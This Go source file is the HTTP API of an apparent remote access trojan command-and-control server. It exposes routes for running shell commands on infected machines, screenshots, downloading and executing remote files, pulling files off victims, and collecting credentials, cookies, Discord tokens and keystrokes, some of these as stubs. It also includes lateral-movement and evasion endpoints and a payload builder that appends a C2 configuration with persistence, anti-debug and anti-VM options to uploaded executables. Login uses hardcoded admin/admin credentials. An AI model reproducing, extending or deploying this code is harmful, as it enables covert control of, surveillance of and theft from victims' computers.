package api

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"rat-c2-server/internal/agent"
	"rat-c2-server/internal/filetransfer"
	"rat-c2-server/internal/task"
	"rat-c2-server/internal/ws"
)

// db is the shared handle for handlers that need raw queries
// (e.g. screenshot download) without a dedicated manager.
var db *sqlx.DB

// SetDB wires the shared database handle. Called once at startup.
func SetDB(d *sqlx.DB) {
	db = d
}

func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager, lateralMgr interface{}, evasionMgr interface{}, wsHub *ws.Hub, config interface{}) {
	api := r.Group("/api")
	{
		// Auth
		api.POST("/auth/login", loginHandler)
		api.POST("/auth/logout", logoutHandler)

		// Agents
		api.GET("/agents", getAgentsHandler(agentMgr))
		api.GET("/agents/:id", getAgentHandler(agentMgr))
		api.DELETE("/agents/:id", deleteAgentHandler(agentMgr))
		api.PATCH("/agents/:id", updateAgentHandler(agentMgr))
		api.POST("/agents/:id/shell", executeShellHandler(taskQueue))
		api.POST("/agents/:id/screenshot", takeScreenshotHandler(taskQueue))
		api.POST("/agents/:id/sleep", sleepHandler(taskQueue))
		api.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
		api.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))

		// Tasks
		api.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
		api.GET("/tasks/:id", getTaskHandler(taskQueue))
		api.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))

		// File Transfers
		api.GET("/agents/:id/files", getFileTransfersHandler(fileMgr))
		api.POST("/agents/:id/files/upload", uploadFileHandler(fileMgr))
		api.POST("/agents/:id/files/download", downloadFileHandler(fileMgr, taskQueue))
		api.POST("/agents/:id/files/download_exec", downloadExecHandler(fileMgr, taskQueue))
		api.GET("/agents/:id/files/list", listDirectoryHandler(fileMgr))
		api.GET("/files/:id/download", downloadStoredFileHandler(fileMgr))
		api.DELETE("/files/:id", deleteFileTransferHandler(fileMgr))

		// Payload Builder
		api.POST("/payloads/build", buildPayloadHandler(fileMgr))
		api.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
		api.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
		api.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))

		// Credentials
		api.GET("/agents/:id/credentials", getCredentialsHandler)
		api.GET("/agents/:id/cookies", getCookiesHandler)
		api.GET("/agents/:id/discord", getDiscordTokensHandler)
		api.GET("/agents/:id/keystrokes", getKeystrokesHandler)

		// Screenshots
		api.GET("/agents/:id/screenshots", getScreenshotsHandler)
		api.GET("/screenshots/:id/download", downloadScreenshotHandler)
		api.DELETE("/screenshots/:id", deleteScreenshotHandler)

		// Lateral Movement
		api.POST("/agents/:id/lateral", executeLateralHandler(lateralMgr))

		// Evasion
		api.POST("/agents/:id/evasion", executeEvasionHandler(evasionMgr))

		// Modules
		api.GET("/modules", getModulesHandler)
		api.POST("/modules/load", loadModuleHandler)
		api.POST("/modules/unload", unloadModuleHandler)
	}
}

func loginHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// TODO: Implement proper authentication
	if req.Username == "admin" && req.Password == "admin" {
		token := uuid.New().String()
		c.JSON(http.StatusOK, gin.H{
			"token": token,
			"user":  gin.H{"username": req.Username},
		})
		return
	}

	c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
}

func logoutHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Logged out"})
}

func getAgentsHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agents := agentMgr.List()
		c.JSON(http.StatusOK, agents)
	}
}

func getAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		c.JSON(http.StatusOK, a)
	}
}

func deleteAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		agentMgr.Remove(id)
		c.JSON(http.StatusOK, gin.H{"message": "Agent removed"})
	}
}

func updateAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var updates map[string]interface{}
		if err := c.ShouldBindJSON(&updates); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		// Apply updates (simplified)
		c.JSON(http.StatusOK, a)
	}
}

func executeShellHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Command string `json:"command" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueShell(agentID, req.Command, 0)
		c.JSON(http.StatusOK, t)
	}
}

func takeScreenshotHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueScreenshot(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func sleepHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Seconds int `json:"seconds" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueSleep(agentID, req.Seconds, 0)
		c.JSON(http.StatusOK, t)
	}
}

func uninstallHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueUninstall(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func updateAgentBinaryHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL string `json:"url" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueUpdate(agentID, req.URL, 0)
		c.JSON(http.StatusOK, t)
	}
}

func getTasksHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		tasks, err := taskQueue.GetByAgent(agentID, 100)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, tasks)
	}
}

func getTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		t, err := taskQueue.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
			return
		}
		c.JSON(http.StatusOK, t)
	}
}

func cancelTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		taskQueue.Cancel(id)
		c.JSON(http.StatusOK, gin.H{"message": "Task cancelled"})
	}
}

func getFileTransfersHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		transfers, err := fileMgr.GetByAgent(agentID)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, transfers)
	}
}

func uploadFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		file, err := c.FormFile("file")
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
			return
		}
		remotePath := c.PostForm("remote_path")
		if remotePath == "" {
			remotePath = file.Filename
		}

		src, err := file.Open()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to open uploaded file"})
			return
		}
		defer src.Close()

		ft, err := fileMgr.CreateUpload(agentID, file.Filename, remotePath, file.Size)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		dst, err := os.Create(ft.TempPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp file"})
			return
		}
		defer dst.Close()

		written, err := io.Copy(dst, src)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write file"})
			return
		}

		ft.Size = written
		ft.Status = "completed"
		now := time.Now()
		ft.CompletedAt = &now

		// Update in database
		fileMgr.GetDB().Exec(`UPDATE files SET size = ?, status = ?, completed_at = ? WHERE id = ?`, ft.Size, ft.Status, ft.CompletedAt, ft.ID)

		c.JSON(http.StatusOK, ft)
	}
}

func downloadFileHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			RemotePath string `json:"remote_path" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownload(agentID, req.RemotePath, req.RemotePath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownload(agentID, req.RemotePath, ft.TempPath, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func downloadExecHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL  string `json:"url" binding:"required"`
			Args string `json:"args"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownloadExec(agentID, req.URL, req.Args)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownloadExec(agentID, req.URL, req.Args, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		log.Printf("[API] Created download_exec task for agent %s: %s -> %s", agentID, req.URL, ft.TempPath)

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func listDirectoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		path := c.DefaultQuery("path", "C:\\")
		entries, err := fileMgr.ListDirectory(agentID, path)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, entries)
	}
}

func downloadStoredFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		ft, err := fileMgr.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.File(ft.TempPath)
	}
}

func deleteFileTransferHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		fileMgr.Delete(id)
		c.JSON(http.StatusOK, gin.H{"message": "File transfer deleted"})
	}
}

func getCredentialsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getCookiesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getDiscordTokensHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getKeystrokesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getScreenshotsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func downloadScreenshotHandler(c *gin.Context) {
	id := c.Param("id")
	var shot struct {
		Filename string `db:"filename"`
		FilePath string `db:"file_path"`
	}
	err := db.Get(&shot, "SELECT filename, file_path FROM screenshots WHERE id = ?", id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot not found"})
		return
	}

	path := shot.FilePath
	if path == "" {
		// Fallback: derive from configured storage root
		path = filepath.Join("data", "screenshots", id+".png")
	}
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot file not found on disk"})
		return
	}

	fn := shot.Filename
	if fn == "" {
		fn = id + ".png"
	}
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fn))
	c.Header("Content-Type", "image/png")
	c.File(path)
}

func deleteScreenshotHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Screenshot deleted"})
}

func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Target    string                 `json:"target" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Lateral movement task created"})
	}
}

func executeEvasionHandler(evasionMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Evasion task created"})
	}
}

func getModulesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func loadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module loaded"})
}

func unloadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module unloaded"})
}

// Payload Builder handlers
type PayloadRecord struct {
	ID        string    `json:"id" db:"id"`
	Filename  string    `json:"filename" db:"filename"`
	Size      int64     `json:"size" db:"size"`
	Status    string    `json:"status" db:"status"`
	CreatedAt time.Time `json:"created_at" db:"created_at"`
	TempPath  string    `json:"-" db:"temp_path"`
	Config    string    `json:"config" db:"config"`
}

func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		err := c.Request.ParseMultipartForm(300 << 20) // 300MB max
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
			return
		}

		file, header, err := c.Request.FormFile("binary")
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No binary file provided"})
			return
		}
		defer file.Close()

		if !strings.HasSuffix(strings.ToLower(header.Filename), ".exe") {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Only .exe files are supported"})
			return
		}

		// Parse config from form
		cfg := PayloadConfig{
			C2Host:       c.PostForm("c2_host"),
			C2Port:       c.PostForm("c2_port"),
			UseTLS:       c.PostForm("use_tls") == "true",
			Key:          c.PostForm("key"),
			HMACKey:      c.PostForm("hmac_key"),
			SleepInterval: parseInt(c.PostForm("sleep_interval"), 60),
			Jitter:       parseInt(c.PostForm("jitter"), 10),
			Persistence:  c.PostForm("persistence") == "true",
			HideConsole:  c.PostForm("hide_console") == "true",
			AntiDebug:    c.PostForm("anti_debug") == "true",
			AntiVM:       c.PostForm("anti_vm") == "true",
			InjectionMethod: c.PostForm("injection_method"),
		}

		if cfg.C2Host == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "C2 host is required"})
			return
		}

		// Create payload record
		payloadID := uuid.New().String()
		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+".exe")

		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create payload directory"})
			return
		}

		// Read the uploaded binary into memory so we can inject the C2 config trailer.
		exeBytes, err := io.ReadAll(file)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
			return
		}

		// Serialize the operator C2 config and append it as a discoverable trailer.
		// Loader contract: scan for magic "RATC2CFG", next 4 bytes = uint32 LE length,
		// then that many bytes of JSON (PayloadConfig). The agent reads this to beacon.
		configJSON, err := json.Marshal(cfg)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode config"})
			return
		}
		var lenBuf [4]byte
		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
		trailer := append(append([]byte("RATC2CFG"), lenBuf[:]...), configJSON...)
		patched := append(exeBytes, trailer...)

		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write patched binary"})
			return
		}
		written := int64(len(patched))

		// Store in database
		_, err = fileMgr.GetDB().Exec(`
			INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
			VALUES (?, ?, ?, 'completed', ?, ?, ?)
		`, payloadID, header.Filename, written, tempPath, string(configJSON), time.Now())

		if err != nil {
			log.Printf("[Payload] DB insert error: %v", err)
		}

		log.Printf("[Payload] Built payload %s: %s (%d bytes)", payloadID, header.Filename, written)

		c.JSON(http.StatusOK, gin.H{
			"id":       payloadID,
			"filename": header.Filename,
			"url":      fmt.Sprintf("/api/payloads/%s/download", payloadID),
		})
	}
}

type PayloadConfig struct {
	C2Host         string `json:"c2_host"`
	C2Port         string `json:"c2_port"`
	UseTLS         bool   `json:"use_tls"`
	Key            string `json:"key"`
	HMACKey        string `json:"hmac_key"`
	SleepInterval  int    `json:"sleep_interval"`
	Jitter         int    `json:"jitter"`
	Persistence    bool   `json:"persistence"`
	HideConsole    bool   `json:"hide_console"`
	AntiDebug      bool   `json:"anti_debug"`
	AntiVM         bool   `json:"anti_vm"`
	InjectionMethod string `json:"injection_method"`
}

func parseInt(s string, defaultVal int) int {
	if s == "" {
		return defaultVal
	}
	val, err := strconv.Atoi(s)
	if err != nil {
		return defaultVal
	}
	return val
}

func getPayloadHistoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		var payloads []PayloadRecord
		err := fileMgr.GetDB().Select(&payloads, `
			SELECT id, filename, size, status, created_at, temp_path, config
			FROM payloads
			ORDER BY created_at DESC
			LIMIT 100
		`)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, payloads)
	}
}

func downloadPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		if _, err := os.Stat(payload.TempPath); os.IsNotExist(err) {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload file not found on disk"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", payload.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.Header("Content-Length", strconv.FormatInt(payload.Size, 10))
		c.File(payload.TempPath)
	}
}

func deletePayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		// Delete file from disk
		os.Remove(payload.TempPath)

		// Delete from database
		_, err = fileMgr.GetDB().Exec("DELETE FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"message": "Payload deleted"})
	}
}

func startAgentPayloadServer(fileMgr *filetransfer.Manager, port int) {
	mux := http.NewServeMux()

	mux.HandleFunc("/payload/", func(w http.ResponseWriter, r *http.Request) {
		fileID := r.URL.Path[len("/payload/"):]
		if fileID == "" {
			http.NotFound(w, r)
			return
		}

		ft, err := fileMgr.Get(fileID)
		if err != nil {
			log.Printf("[Payload] File not found: %s", fileID)
			http.NotFound(w, r)
			return
		}

		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.FormatInt(ft.Size, 10))
		http.ServeFile(w, r, ft.TempPath)
	})

	log.Printf("[*] Payload server listening on :%d", port)
	http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
}

func serveAgentBinary(fileMgr *filetransfer.Manager, bindAddr string, binaryPath string) {
	mux := http.NewServeMux()

	mux.HandleFunc("/agent", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		http.ServeFile(w, r, binaryPath)
	})

	log.Printf("[*] Agent binary server listening on %s", bindAddr)
	http.ListenAndServe(bindAddr, mux)
}